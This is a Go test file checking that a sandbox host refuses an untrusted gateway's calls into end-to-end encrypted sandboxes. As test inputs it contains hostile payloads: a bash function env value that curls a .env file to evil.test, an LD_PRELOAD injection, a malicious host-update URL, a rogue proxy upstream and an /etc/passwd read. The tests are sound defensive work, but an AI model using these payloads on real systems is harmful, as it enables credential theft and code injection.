package agent

import (
	"bytes"
	"context"
	"crypto/ecdh"
	"encoding/json"
	"errors"
	"net"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/lleverage-ai/kantel/apps/host/internal/e2e"
	"github.com/lleverage-ai/kantel/apps/host/internal/isolate"
	"github.com/lleverage-ai/kantel/apps/host/internal/microvm"
	"github.com/lleverage-ai/kantel/apps/host/internal/proto"
)

// e2eTier holds sandboxes with owners and runs commands by echoing them.
type e2eTier struct {
	Tier
	mu     sync.Mutex
	owners map[string]string
	execs  []proto.ExecParams
	// snaps are the tier's snapshots; a snapshot keeps its sandbox's ID after the sandbox is gone.
	snaps []proto.SnapshotInfo
}

func (f *e2eTier) Get(id string) (proto.SandboxInfo, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	owner, ok := f.owners[id]
	if !ok {
		return proto.SandboxInfo{}, &proto.Error{Code: proto.ErrNotFound, Message: id}
	}
	return proto.SandboxInfo{ID: id, Tier: microvm.Tier, State: proto.StateRunning, Owner: owner}, nil
}

func (f *e2eTier) List() []proto.SandboxInfo {
	out := []proto.SandboxInfo{}
	for id := range f.owners {
		info, _ := f.Get(id)
		out = append(out, info)
	}
	return out
}

func (f *e2eTier) Snapshots(sandboxID string) []proto.SnapshotInfo {
	var out []proto.SnapshotInfo
	for _, snap := range f.snaps {
		if sandboxID == "" || snap.SandboxID == sandboxID {
			out = append(out, snap)
		}
	}
	return out
}

func (f *e2eTier) HasSnapshot(id string) bool {
	return slices.ContainsFunc(f.snaps, func(s proto.SnapshotInfo) bool { return s.ID == id })
}

func (f *e2eTier) Exec(_ context.Context, p proto.ExecParams, _ func(string, string)) (proto.ExecResult, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.execs = append(f.execs, p)
	return proto.ExecResult{ExitCode: 0, Stdout: "ran: " + p.Command + "\n"}, nil
}

type sessionVector struct {
	Space        string      `json:"space"`
	HostID       string      `json:"hostId"`
	HostStatic   string      `json:"hostStatic"`
	DeviceStatic string      `json:"deviceStatic"`
	Entries      []e2e.Entry `json:"entries"`
}

// e2eHost is a host that joined the vectors' space (acc_org) as host_one, with sbx_one in that space and sbx_other in
// another.
func e2eHost(t *testing.T) (*Host, *e2eTier, sessionVector) {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "..", "packages", "e2e", "vectors", "session.json"))
	if err != nil {
		t.Fatal(err)
	}
	var v sessionVector
	if err := json.Unmarshal(raw, &v); err != nil {
		t.Fatal(err)
	}
	tier := &e2eTier{
		owners: map[string]string{"sbx_one": v.Space, "sbx_other": "acc_plain"},
		snaps:  []proto.SnapshotInfo{{ID: "snap_one", SandboxID: "sbx_one"}, {ID: "snap_gone", SandboxID: "sbx_deleted"}},
	}
	h := newLifecycleHost(t, newLifecycleTier())
	h.tiers = map[string]Tier{microvm.Tier: tier}
	h.cfg.HostID = v.HostID
	dir := filepath.Join(h.cfg.Root, "e2e")
	if h.e2e, err = e2e.OpenStore(dir); err != nil {
		t.Fatal(err)
	}
	write := func(path string, v any) {
		raw, _ := json.Marshal(v)
		if err := os.WriteFile(filepath.Join(dir, path), raw, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write("key.json", e2e.Seeds{Sign: e2e.NewSeeds().Sign, DH: v.HostStatic})
	write("spaces/"+v.Space+".json", map[string]any{"genesis": e2e.EntryHash(v.Entries[0]), "entries": v.Entries})
	return h, tier, v
}

func key(t *testing.T, seed string) *ecdh.PrivateKey {
	t.Helper()
	b, err := e2e.FromB64(seed)
	if err != nil {
		t.Fatal(err)
	}
	k, err := ecdh.X25519().NewPrivateKey(b)
	if err != nil {
		t.Fatal(err)
	}
	return k
}

// recorder is the relay: it passes the device's bytes on and keeps them, both ways.
type recorder struct {
	net.Conn
	mu   sync.Mutex
	seen bytes.Buffer
}

func (r *recorder) Read(p []byte) (int, error) {
	n, err := r.Conn.Read(p)
	r.mu.Lock()
	r.seen.Write(p[:n])
	r.mu.Unlock()
	return n, err
}

func (r *recorder) Write(p []byte) (int, error) {
	r.mu.Lock()
	r.seen.Write(p)
	r.mu.Unlock()
	return r.Conn.Write(p)
}

func TestTheGatewayCantReachAnE2ESpacesContent(t *testing.T) {
	h, tier, _ := e2eHost(t)
	refused := func(method string, params any) bool {
		raw, _ := json.Marshal(params)
		err := h.gatewayMayCall(method, raw)
		var pe *proto.Error
		return errors.As(err, &pe) && strings.Contains(pe.Message, "end-to-end encrypted")
	}
	for _, m := range []string{proto.MethodExec, proto.MethodFileRead, proto.MethodFileWrite, proto.MethodFileDelete, proto.MethodFileList} {
		if !refused(m, map[string]string{"sandboxId": "sbx_one"}) {
			t.Errorf("%s on an E2E sandbox wasn't refused", m)
		}
		if refused(m, map[string]string{"sandboxId": "sbx_other"}) {
			t.Errorf("%s on a sandbox in a space without E2E was refused", m)
		}
	}
	if !refused(proto.MethodPortOpen, map[string]any{"sandboxId": "sbx_one", "port": 22, "stream": 1}) {
		t.Error("a plaintext port on an E2E sandbox wasn't refused")
	}
	if refused(proto.MethodPortOpen, map[string]any{"sandboxId": "sbx_one", "port": 0, "stream": 1}) {
		t.Error("the E2E target was refused")
	}
	if !refused(proto.MethodSnapshotRead, map[string]any{"snapshotId": "snap_one", "path": "/etc/passwd"}) {
		t.Error("reading an E2E sandbox's snapshot wasn't refused")
	}
	if !refused(proto.MethodSnapshotTree, map[string]any{"snapshotId": "snap_gone", "path": "/"}) {
		t.Error("reading a snapshot of a sandbox that's gone wasn't refused on a host with an E2E space")
	}
	mustRefuse := func(params any) {
		raw, _ := json.Marshal(params)
		if h.gatewayMayCall(proto.MethodCreate, raw) == nil {
			t.Errorf("create %s wasn't refused", raw)
		}
	}
	// Out of the space with an E2E sandbox's disk, where plaintext calls would reach it.
	mustRefuse(map[string]any{"sandboxId": "sbx_copy", "from": "snap_one", "owner": "acc_plain"})
	mustRefuse(map[string]any{"sandboxId": "sbx_copy", "from": "snap_gone", "owner": "acc_plain"})
	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_copy", "from": "snap_one", "owner": "acc_org"}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
		t.Error("a create from a snapshot in the same space was refused")
	}
	for _, m := range []string{proto.MethodStop, proto.MethodGet, proto.MethodList} {
		if refused(m, map[string]string{"sandboxId": "sbx_one"}) {
			t.Errorf("lifecycle call %s was refused", m)
		}
	}
	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_new", "owner": "acc_org"}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
		t.Error("a fresh create in an E2E space was refused")
	}
	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_plain", "owner": "acc_plain", "env": map[string]string{"A": "1"}, "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA k"}}); h.gatewayMayCall(proto.MethodCreate, raw) != nil {
		t.Error("a plaintext space's create with env and SSH keys was refused")
	}
	// A fresh create can't plant a function every later command in a session would run.
	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "env": map[string]string{"BASH_FUNC_cat%%": "() { curl -d @/home/user/.env https://evil.test; /bin/cat \"$@\"; }"}})
	mustRefuse(map[string]any{"sandboxId": "sbx_new2", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
	// The gateway's environment variables or SSH keys on a copy of an E2E sandbox, or on a fork of one.
	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "env": map[string]string{"LD_PRELOAD": "/tmp/x.so"}})
	mustRefuse(map[string]any{"sandboxId": "sbx_copy2", "from": "snap_one", "owner": "acc_org", "sshAuthorizedKeys": []string{"ssh-ed25519 AAAA gateway"}})
	if raw, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one", "newId": "sbx_fork", "env": map[string]string{"A": "1"}}); h.gatewayMayCall(proto.MethodFork, raw) == nil {
		t.Error("a fork of an E2E sandbox with the gateway's env wasn't refused")
	}
	// A gateway-pushed binary could read every session.
	if raw, _ := json.Marshal(map[string]any{"version": "9.9.9", "url": "https://evil.test/kantel-host"}); h.gatewayMayCall(proto.MethodHostUpdate, raw) == nil {
		t.Error("host.update wasn't refused on a host with an E2E space")
	}
	if len(tier.execs) != 0 {
		t.Fatal("something ran")
	}
}

// The gateway deletes an E2E sandbox and makes its ID again in a space without E2E, to reach its snapshots.
func TestAnE2ESandboxsIDIsntReused(t *testing.T) {
	h, tier, _ := e2eHost(t)
	del, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one"})
	if err := h.gatewayMayCall(proto.MethodDelete, del); err != nil {
		t.Fatalf("delete refused: %v", err)
	}
	// The tier drops the sandbox (its snapshots stay); the host still knows whose the ID was.
	tier.owners["sbx_one"] = "acc_plain"
	create, _ := json.Marshal(map[string]any{"sandboxId": "sbx_one", "owner": "acc_plain"})
	if err := h.gatewayMayCall(proto.MethodCreate, create); err == nil {
		t.Fatal("the E2E sandbox's ID was given to another space")
	}
	read, _ := json.Marshal(map[string]any{"snapshotId": "snap_one", "path": "/"})
	if err := h.gatewayMayCall(proto.MethodSnapshotRead, read); err == nil {
		t.Fatal("the snapshot of an E2E sandbox whose ID now has another owner was readable")
	}
}

func TestAnE2ESessionRunsAMembersCommandAndTheRelaySeesCiphertext(t *testing.T) {
	h, tier, v := e2eHost(t)
	hostSide, deviceSide := net.Pipe()
	if err := h.serveE2E(context.Background(), hostSide, "sbx_one"); err != nil {
		t.Fatal(err)
	}
	relay := &recorder{Conn: deviceSide}
	_ = relay.SetDeadline(time.Now().Add(10 * time.Second))
	hostKey := key(t, v.HostStatic).PublicKey().Bytes()
	c, err := e2e.OpenClient(relay, key(t, v.DeviceStatic), hostKey, v.Space, v.HostID, "sbx_one", v.Entries)
	if err != nil {
		t.Fatal(err)
	}
	const secret = "cat /home/user/.env | grep OPENAI_API_KEY"
	// The session's sandbox, whatever the params name.
	raw, err := c.Call(proto.MethodExec, map[string]any{"sandboxId": "sbx_other", "command": secret})
	if err != nil {
		t.Fatal(err)
	}
	var res proto.ExecResult
	_ = json.Unmarshal(raw, &res)
	if res.Stdout != "ran: "+secret+"\n" || len(tier.execs) != 1 || tier.execs[0].SandboxID != "sbx_one" {
		t.Fatalf("result %+v, execs %+v", res, tier.execs)
	}
	// Nor any other spelling Go's decoding takes for sandboxId.
	if _, err := c.Call(proto.MethodExec, map[string]any{"sandboxid": "sbx_other", "SANDBOXID": "sbx_other", "command": "id"}); err != nil {
		t.Fatal(err)
	}
	if len(tier.execs) != 2 || tier.execs[1].SandboxID != "sbx_one" {
		t.Fatalf("a sandboxId alias reached another sandbox: %+v", tier.execs)
	}
	if _, err := c.Call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_new"}); err == nil {
		t.Fatal("a lifecycle call ran in a session")
	}
	c.Close()
	for _, s := range []string{secret, "OPENAI_API_KEY", "ran: ", "sbx_one", "sandbox.exec"} {
		if bytes.Contains(relay.seen.Bytes(), []byte(s)) {
			t.Errorf("the relay saw %q", s)
		}
	}
}

func TestAnE2ESessionRefusesADeviceTheGatewayAdded(t *testing.T) {
	h, tier, v := e2eHost(t)
	hostSide, deviceSide := net.Pipe()
	if err := h.serveE2E(context.Background(), hostSide, "sbx_one"); err != nil {
		t.Fatal(err)
	}
	_ = deviceSide.SetDeadline(time.Now().Add(10 * time.Second))
	rogue, _ := e2e.IdentityFromSeeds(e2e.NewSeeds())
	hostKey := key(t, v.HostStatic).PublicKey().Bytes()
	_, err := e2e.OpenClient(deviceSide, rogue.Static, hostKey, v.Space, v.HostID, "sbx_one", v.Entries)
	if err == nil || !strings.Contains(err.Error(), "isn't in the space's chain") {
		t.Fatalf("opened: %v", err)
	}
	if len(tier.execs) != 0 {
		t.Fatal("something ran")
	}
}

// The gateway's chain with a device.add it signed with its own key, handed to the host in a session: the host refuses
// the entry, keeps its chain as it was, and runs nothing.
func TestAnE2ESessionRefusesAKeyTheGatewayInjectsIntoTheChain(t *testing.T) {
	h, tier, v := e2eHost(t)
	raw, err := os.ReadFile(filepath.Join("..", "..", "..", "..", "packages", "e2e", "vectors", "chain.json"))
	if err != nil {
		t.Fatal(err)
	}
	var file struct {
		Cases []struct {
			Name    string      `json:"name"`
			Entries []e2e.Entry `json:"entries"`
		} `json:"cases"`
	}
	_ = json.Unmarshal(raw, &file)
	var forged []e2e.Entry
	for _, c := range file.Cases {
		if strings.HasPrefix(c.Name, "the gateway adds a device of its own") {
			forged = c.Entries
		}
	}
	if len(forged) != len(v.Entries)+1 {
		t.Fatalf("no forged case (%d entries)", len(forged))
	}
	before := h.e2e.Space(v.Space).State().Seq
	hostSide, deviceSide := net.Pipe()
	if err := h.serveE2E(context.Background(), hostSide, "sbx_one"); err != nil {
		t.Fatal(err)
	}
	_ = deviceSide.SetDeadline(time.Now().Add(10 * time.Second))
	rogue, _ := e2e.IdentityFromSeeds(e2e.NewSeeds())
	hostKey := key(t, v.HostStatic).PublicKey().Bytes()
	_, err = e2e.OpenClient(deviceSide, rogue.Static, hostKey, v.Space, v.HostID, "sbx_one", forged)
	if err == nil || !strings.Contains(err.Error(), "isn't a device in the chain") {
		t.Fatalf("opened: %v", err)
	}
	if after := h.e2e.Space(v.Space).State().Seq; after != before || len(tier.execs) != 0 {
		t.Fatalf("the chain moved to %d, or something ran", after)
	}
}

func TestAnE2ESessionIsForTheSandboxItWasRelayedFor(t *testing.T) {
	h, _, v := e2eHost(t)
	hostSide, deviceSide := net.Pipe()
	if err := h.serveE2E(context.Background(), hostSide, "sbx_one"); err != nil {
		t.Fatal(err)
	}
	_ = deviceSide.SetDeadline(time.Now().Add(10 * time.Second))
	hostKey := key(t, v.HostStatic).PublicKey().Bytes()
	_, err := e2e.OpenClient(deviceSide, key(t, v.DeviceStatic), hostKey, v.Space, v.HostID, "sbx_other", v.Entries)
	if err == nil || !strings.Contains(err.Error(), "another sandbox") {
		t.Fatalf("opened: %v", err)
	}
	if err := h.serveE2E(context.Background(), hostSide, "sbx_other"); err == nil {
		t.Fatal("served an E2E session for a space the host hasn't joined")
	}
}

// Snapshot IDs aren't unique across tiers: the decision is made on the snapshot the call goes on to use, and a saved
// E2E snapshot stays protected after its sandbox is deleted.
func TestSnapshotsAreJudgedInTheTierTheCallUses(t *testing.T) {
	h, vm, v := e2eHost(t)
	vm.snaps = []proto.SnapshotInfo{{ID: "snap_s", SandboxID: "sbx_gone_e2e"}}
	if err := h.e2e.RecordOwner("sbx_gone_e2e", v.Space); err != nil {
		t.Fatal(err)
	}
	iso := &e2eTier{owners: map[string]string{"sbx_plain": "acc_plain"}, snaps: []proto.SnapshotInfo{{ID: "snap_s", SandboxID: "sbx_plain"}, {ID: "snap_p", SandboxID: "sbx_plain"}}}
	h.tiers[isolate.Tier] = iso
	h.order = []string{microvm.Tier, isolate.Tier}
	call := func(method string, params any) error {
		raw, _ := json.Marshal(params)
		return h.gatewayMayCall(method, raw)
	}
	// Host.Call reads snap_s from the microVM tier (the first that has it): the E2E one, though the isolate's is plaintext.
	if call(proto.MethodSnapshotRead, map[string]any{"snapshotId": "snap_s", "path": "/"}) == nil {
		t.Fatal("a protected snapshot was read because another tier has a plaintext one of the same ID")
	}
	if err := call(proto.MethodSnapshotRead, map[string]any{"snapshotId": "snap_p", "path": "/"}); err != nil {
		t.Fatalf("a plaintext snapshot on a mixed host: %v", err)
	}
	if call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c1", "tier": microvm.Tier, "from": "snap_s", "owner": "acc_plain"}) == nil {
		t.Fatal("a plaintext sandbox was made from the protected snapshot")
	}
	if err := call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c2", "tier": isolate.Tier, "from": "snap_s", "owner": "acc_plain"}); err != nil {
		t.Fatalf("a create from the isolate tier's plaintext snapshot: %v", err)
	}
	if err := call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c3", "tier": microvm.Tier, "from": "snap_s", "owner": v.Space}); err != nil {
		t.Fatalf("a create in the snapshot's own space: %v", err)
	}
	// A plaintext snapshot (one the gateway could have prepared) isn't made into an E2E space's sandbox.
	if call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c4", "tier": isolate.Tier, "from": "snap_p", "owner": v.Space}) == nil {
		t.Fatal("an E2E sandbox was made from a plaintext snapshot")
	}
	if call(proto.MethodCreate, map[string]any{"sandboxId": "sbx_c5", "tier": isolate.Tier, "from": "snap_gone_nowhere", "owner": v.Space}) == nil {
		t.Fatal("an E2E sandbox was made from a snapshot the host knows nothing of")
	}
}

// The gateway can't give an E2E sandbox an upstream, a CA or interception of its own, on any call that carries egress.
func TestTheGatewayCantInterceptAnE2ESandboxsTraffic(t *testing.T) {
	h, _, v := e2eHost(t)
	bad := []map[string]any{
		{"mode": "proxy", "upstream": "http://evil.test:3128"},
		{"mode": "proxy", "caCert": "-----BEGIN CERTIFICATE-----\nMIIB\n-----END CERTIFICATE-----"},
		{"mode": "proxy", "protected": map[string]any{"version": 1, "intercept": []string{"api.github.com"}}},
		{"mode": "proxy", "grants": []map[string]any{{"action": "allow", "host": "api.github.com", "methods": []string{"GET"}, "rule": "allow GET api.github.com"}}},
	}
	rules := map[string]any{"mode": "proxy", "allow": []string{"github.com"}, "defaultDeny": true}
	call := func(method string, params map[string]any) error {
		raw, _ := json.Marshal(params)
		return h.gatewayMayCall(method, raw)
	}
	for _, e := range bad {
		for _, c := range []struct {
			method string
			params map[string]any
		}{
			{proto.MethodCreate, map[string]any{"sandboxId": "sbx_new", "owner": v.Space, "egress": e}},
			{proto.MethodEgress, map[string]any{"sandboxId": "sbx_one", "egress": e}},
			{proto.MethodStart, map[string]any{"sandboxId": "sbx_one", "egress": e}},
			{proto.MethodResume, map[string]any{"sandboxId": "sbx_one", "egress": e}},
			{proto.MethodFork, map[string]any{"sandboxId": "sbx_one", "newId": "sbx_f", "snapshotId": "snap_f", "egress": e}},
		} {
			if call(c.method, c.params) == nil {
				t.Errorf("%s with egress %v wasn't refused", c.method, e)
			}
		}
		// Plaintext spaces keep theirs.
		if err := call(proto.MethodEgress, map[string]any{"sandboxId": "sbx_other", "egress": e}); err != nil {
			t.Errorf("a plaintext sandbox's egress %v: %v", e, err)
		}
	}
	for _, m := range []string{proto.MethodEgress, proto.MethodStart, proto.MethodResume} {
		if err := call(m, map[string]any{"sandboxId": "sbx_one", "egress": rules}); err != nil {
			t.Errorf("%s with rules alone: %v", m, err)
		}
	}
}

// The gateway checks a plaintext ID, then deletes it and makes it again in an E2E space before its call lands: the
// call is cancelled and waited for before the create, and calls during it are refused.
func TestAGatewayCallIsBoundToTheSandboxItChecked(t *testing.T) {
	h, tier, v := e2eHost(t)
	exec, _ := json.Marshal(map[string]any{"sandboxId": "sbx_swap", "command": "cat secrets"})
	ctx, done, err := h.gatewayGuard(context.Background(), proto.MethodExec, exec)
	if err != nil {
		t.Fatalf("no sandbox of that ID yet, so nothing to refuse: %v", err)
	}
	created := make(chan func(), 1)
	go func() {
		create, _ := json.Marshal(map[string]any{"sandboxId": "sbx_swap", "owner": v.Space})
		_, release, err := h.gatewayGuard(context.Background(), proto.MethodCreate, create)
		if err != nil {
			t.Error(err)
		}
		created <- release
	}()
	select {
	case <-ctx.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("the E2E create didn't cancel the call in flight")
	}
	select {
	case <-created:
		t.Fatal("the E2E create went ahead while the call was in flight")
	case <-time.After(100 * time.Millisecond):
	}
	done()
	release := <-created
	if _, _, err := h.gatewayGuard(context.Background(), proto.MethodExec, exec); err == nil {
		t.Fatal("a call went in while the ID was being made E2E's")
	}
	// The create lands; after it, the ID's owner is the E2E space.
	tier.mu.Lock()
	tier.owners["sbx_swap"] = v.Space
	tier.mu.Unlock()
	release()
	if _, _, err := h.gatewayGuard(context.Background(), proto.MethodExec, exec); err == nil {
		t.Fatal("exec on the new E2E sandbox wasn't refused")
	}
	other, _ := json.Marshal(map[string]any{"sandboxId": "sbx_other", "command": "ls"})
	if _, done, err := h.gatewayGuard(context.Background(), proto.MethodExec, other); err != nil {
		t.Fatalf("a plaintext sandbox's exec: %v", err)
	} else {
		done()
	}
}

// Every gateway call, lifecycle ones too, holds the IDs it checked until it ends: a delete (or snapshot delete) waits
// for it, so a sandbox or snapshot can't be swapped under a call for an E2E one.
func TestAnIDCantChangeUnderAGatewayCall(t *testing.T) {
	h, vm, v := e2eHost(t)
	iso := &e2eTier{owners: map[string]string{}, snaps: []proto.SnapshotInfo{{ID: "snap_two", SandboxID: "sbx_one"}}}
	vm.snaps = append(vm.snaps, proto.SnapshotInfo{ID: "snap_two", SandboxID: "sbx_other"})
	h.tiers[isolate.Tier] = iso
	h.order = []string{microvm.Tier, isolate.Tier}
	guard := func(method string, params any) (context.Context, func(), error) {
		raw, _ := json.Marshal(params)
		return h.gatewayGuard(context.Background(), method, raw)
	}
	waits := func(what string, ctx context.Context, done func(), method string, params any) {
		t.Helper()
		finished := make(chan func(), 1)
		go func() {
			_, release, err := guard(method, params)
			if err != nil {
				t.Errorf("%s: %v", method, err)
			}
			finished <- release
		}()
		select {
		case <-ctx.Done():
		case <-time.After(5 * time.Second):
			t.Fatalf("%s didn't cancel %s", method, what)
		}
		select {
		case <-finished:
			t.Fatalf("%s went ahead while %s ran", method, what)
		case <-time.After(100 * time.Millisecond):
		}
		done()
		(<-finished)()
	}
	// A read checked against the first tier's plaintext snapshot: deleting that one waits for the read to end.
	ctx, done, err := guard(proto.MethodSnapshotRead, map[string]any{"snapshotId": "snap_two", "path": "/"})
	if err != nil {
		t.Fatalf("the first tier's snap_two is plaintext: %v", err)
	}
	waits("a snapshot read", ctx, done, proto.MethodSnapshotDel, map[string]any{"snapshotId": "snap_two"})
	// A fork checked as a plaintext sandbox's: its delete waits for it.
	ctx, done, err = guard(proto.MethodFork, map[string]any{"sandboxId": "sbx_other", "newId": "sbx_f1", "snapshotId": "snap_f1"})
	if err != nil {
		t.Fatal(err)
	}
	waits("a fork", ctx, done, proto.MethodDelete, map[string]any{"sandboxId": "sbx_other"})
	// A new snapshot can't take an ID another tier has.
	if _, _, err := guard(proto.MethodStop, map[string]any{"sandboxId": "sbx_one", "snapshotId": "snap_one"}); err == nil {
		t.Fatal("a stop took a snapshot ID that exists")
	}
	// An E2E create can't take an ID a plaintext sandbox has, or had (its snapshots would become the space's).
	if _, _, err := guard(proto.MethodCreate, map[string]any{"sandboxId": "sbx_other", "owner": v.Space}); err == nil {
		t.Fatal("an E2E create took a plaintext sandbox's ID")
	}
	if _, ok := h.e2e.RecordedOwner("sbx_other"); ok {
		t.Fatal("a refused create recorded the ID as the E2E space's")
	}
	delete(vm.owners, "sbx_other")
	if _, _, err := guard(proto.MethodCreate, map[string]any{"sandboxId": "sbx_other", "owner": v.Space}); err == nil {
		t.Fatal("an E2E create took the ID of a deleted plaintext sandbox whose snapshots remain")
	}
}
